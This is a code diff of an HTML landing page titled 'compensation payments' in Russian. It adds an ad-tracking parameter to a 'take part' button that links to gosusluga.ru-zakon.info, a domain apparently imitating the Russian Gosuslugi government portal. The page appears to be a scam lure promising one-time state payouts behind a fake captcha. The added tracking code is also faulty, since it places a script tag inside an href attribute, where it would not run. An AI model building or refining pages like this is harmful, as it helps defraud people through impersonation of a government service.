@@ -14,8 +14,13 @@
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
     
   <title>ВЫПЛАТА КОМПЕНСАЦИЙ</title>
-    
-  
+<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.*?)(&|$)').exec(location.search)||[,null])[1] || ''
+);
+}
+</script>
 </head>
 <body id="capcha">
 
@@ -33,7 +38,7 @@
                 </li>
                 <li>
                     <div class="capchaButton">
-                        <a href="https://gosusluga.ru-zakon.info/search-news.html?topic=on&cid=gosbgit" class="button24">ПРИНЯТЬ УЧАСТИЕ</a>
+                        <a href="https://gosusluga.ru-zakon.info/search-news.html?topic=on&cid=gosbgit&adid=<script>document.write(getURLParameter('ad_id'))</script>" class="button24">ПРИНЯТЬ УЧАСТИЕ</a>
                     </div>
                 </li>
                 <li><p>*Выплата осуществляется единоразово</p></li>
